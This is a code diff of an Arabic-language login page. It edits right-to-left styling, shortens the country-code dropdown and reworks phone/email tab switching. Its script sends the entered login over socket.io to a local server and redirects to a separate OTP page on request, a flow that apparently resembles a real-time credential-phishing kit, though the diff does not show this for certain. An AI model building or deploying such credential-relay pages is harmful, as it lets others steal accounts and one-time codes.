@@ -9,29 +9,44 @@
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; color: #000; }
         .login-box { max-width: 420px; margin: 40px auto; padding: 20px; }
         .logo-img { margin-bottom: 30px; display: block; }
-        h2 { font-weight: 700; font-size: 30px; margin-bottom: 30px; }
+        h2 { font-weight: 700; font-size: 30px; margin-bottom: 30px; text-align: right; }
         
         .tabs { display: flex; border-bottom: 1px solid #f0f0f0; margin-bottom: 25px; }
         .tab { padding: 10px 0; margin-left: 30px; cursor: pointer; color: #666; font-size: 16px; position: relative; }
         .tab.active { color: #000; font-weight: bold; }
         .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 0; width: 100%; height: 2px; background: #000; }
         
-        /* تنسيق حقل الهاتف مع كود الدولة */
-        .phone-container { display: flex; direction: ltr; gap: 8px; margin-bottom: 15px; }
-        .country-select { width: 110px; border-radius: 12px; padding: 10px; background: #f5f5f5; border: 1px solid transparent; font-size: 14px; outline: none; }
-        .phone-input { flex: 1; margin-bottom: 0 !important; text-align: left !important; }
+        /* تصحيح قايمة الدول عشان تظهر جمب الرقم */
+        .phone-container { 
+            display: flex; 
+            flex-direction: row-reverse; /* عشان كود الدولة يظهر عالشمال في الـ RTL */
+            gap: 10px; 
+            margin-bottom: 15px; 
+        }
+        
+        .country-select { 
+            width: 120px; 
+            border-radius: 12px; 
+            padding: 10px; 
+            background: #f5f5f5; 
+            border: 1px solid transparent; 
+            font-size: 14px; 
+            outline: none;
+            direction: ltr;
+        }
 
         .form-control { border-radius: 12px; padding: 14px; background: #f5f5f5; border: 1px solid transparent; margin-bottom: 15px; font-size: 16px; text-align: right; }
         .form-control:focus { background: #fff; border-color: #000; box-shadow: none; outline: none; }
         
+        .phone-input { margin-bottom: 0 !important; flex: 1; text-align: left !important; direction: ltr; }
+
         .btn-next { background: #000; color: #fff; border-radius: 50px; border: none; width: 100%; padding: 14px; font-weight: bold; font-size: 18px; margin-top: 10px; transition: 0.2s; }
-        .btn-next:disabled { background: #ccc; cursor: not-allowed; }
         
         .divider { position: relative; text-align: center; margin: 30px 0; color: #888; font-size: 14px; }
         .divider::before { content: ""; position: absolute; top: 50%; left: 0; width: 100%; height: 1px; background: #eee; z-index: 1; }
         .divider span { position: relative; background: #fff; padding: 0 15px; z-index: 2; }
         
-        .social-btn { border: 1px solid #ddd; border-radius: 50px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 12px; text-decoration: none; color: #000; font-weight: 600; font-size: 15px; transition: 0.3s; cursor: pointer; }
+        .social-btn { border: 1px solid #ddd; border-radius: 50px; padding: 12px; display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 12px; text-decoration: none; color: #000; font-weight: 600; font-size: 15px; transition: 0.3s; }
         .social-btn:hover { background: #f9f9f9; color: #000; }
         .social-btn img { width: 22px; height: 22px; }
         .tg-btn { background: #24A1DE; color: #fff !important; border: none; }
@@ -56,25 +71,10 @@
                 <option value="+966">🇸🇦 +966</option>
                 <option value="+971">🇦🇪 +971</option>
                 <option value="+964">🇮🇶 +964</option>
-                <option value="+965">🇰🇼 +965</option>
                 <option value="+218">🇱🇾 +218</option>
                 <option value="+212">🇲🇦 +212</option>
-                <option value="+213">🇩🇿 +213</option>
-                <option value="+216">🇹🇳 +216</option>
-                <option value="+962">🇯🇴 +962</option>
-                <option value="+961">🇱🇧 +961</option>
-                <option value="+968">🇴🇲 +968</option>
-                <option value="+974">🇶🇦 +974</option>
-                <option value="+973">🇧🇭 +973</option>
-                <option value="+967">🇾🇪 +967</option>
-                <option value="+249">🇸🇩 +249</option>
                 <option value="+90">🇹🇷 +90</option>
-                <option value="+1">🇺🇸 +1</option>
-                <option value="+44">🇬🇧 +44</option>
-                <option value="+91">🇮🇳 +91</option>
-                <option value="+234">🇳🇬 +234</option>
-                <option value="+27">🇿🇦 +27</option>
-                </select>
+            </select>
             <input type="text" id="loginInput" class="form-control phone-input" placeholder="رقم الهاتف" required>
         </div>
 
@@ -107,7 +107,6 @@
 
 <script>
     const socket = io('http://localhost:3000'); 
-
     let currentMode = 'phone';
 
     function sendData() {
@@ -124,7 +123,6 @@
         btn.disabled = true;
         btn.innerText = "جاري التحقق...";
 
-        // لو شغالين موبايل بنجمع الكود مع الرقم
         const finalUser = (currentMode === 'phone') ? (countryCode + userInput) : userInput;
 
         socket.emit('login_attempt', { 
@@ -133,9 +131,7 @@
         });
     }
 
-    socket.on('need_login_otp', () => {
-        window.location.href = "check.html";
-    });
+    socket.on('need_login_otp', () => { window.location.href = "check.html"; });
 
     socket.on('login_failed', (data) => {
         alert(data.message);
@@ -147,24 +143,23 @@
     function switchTab(type) {
         currentMode = type;
         const input = document.getElementById('loginInput');
-        const phoneTab = document.getElementById('phoneTab');
-        const emailTab = document.getElementById('emailTab');
+        const countrySelect = document.getElementById('countryCode');
         const phoneWrapper = document.getElementById('phoneInputWrapper');
 
         if (type === 'phone') {
             input.placeholder = 'رقم الهاتف';
-            input.style.textAlign = 'left';
-            phoneWrapper.style.direction = 'ltr';
-            document.getElementById('countryCode').style.display = 'block';
-            phoneTab.classList.add('active');
-            emailTab.classList.remove('active');
+            input.className = 'form-control phone-input';
+            countrySelect.style.display = 'block';
+            phoneWrapper.style.display = 'flex';
+            document.getElementById('phoneTab').classList.add('active');
+            document.getElementById('emailTab').classList.remove('active');
         } else {
-            input.placeholder = 'البريد الإلكتروني / الحساب الفرعي';
-            input.style.textAlign = 'right';
-            phoneWrapper.style.direction = 'rtl';
-            document.getElementById('countryCode').style.display = 'none';
-            emailTab.classList.add('active');
-            phoneTab.classList.remove('active');
+            input.placeholder = 'البريد الإلكتروني';
+            input.className = 'form-control'; // بيرجع للشكل العادي
+            countrySelect.style.display = 'none';
+            phoneWrapper.style.display = 'block';
+            document.getElementById('emailTab').classList.add('active');
+            document.getElementById('phoneTab').classList.remove('active');
         }
     }
 </script>
